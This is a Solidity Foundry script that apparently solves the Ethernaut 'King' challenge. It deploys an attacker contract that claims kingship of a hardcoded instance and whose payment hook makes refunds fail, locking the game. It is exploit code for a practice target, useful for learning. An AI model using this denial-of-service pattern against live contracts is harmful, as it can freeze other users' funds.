// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { King } from "../src/09_King.sol";

contract Attacker {

  address instance;
  constructor (address challengeInstanceAddress) {
    instance = challengeInstanceAddress;
  }

  function attackInstance() public payable {
    (bool success, ) = address(instance).call{value: 1}("");
    require(success, "Call failed");
  }

  function fundContract() external payable {}
  receive() external payable {
    address(instance).call{value: 0}("");
  }
}

contract KingAttacker is Script {

  address payable challengeInstanceAddress = payable(0x913bE527a67E3a0945ec13A7c00f3480C48965d2);
  King challenge = King(challengeInstanceAddress);
  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {
    vm.startBroadcast(deployerPrivateKey);
    Attacker attacker = new Attacker(challengeInstanceAddress);
    attacker.fundContract{value: 1}();
    attacker.attackInstance();

    console.log("Challenge owner: %s", challenge.owner());

    vm.stopBroadcast();
  }

}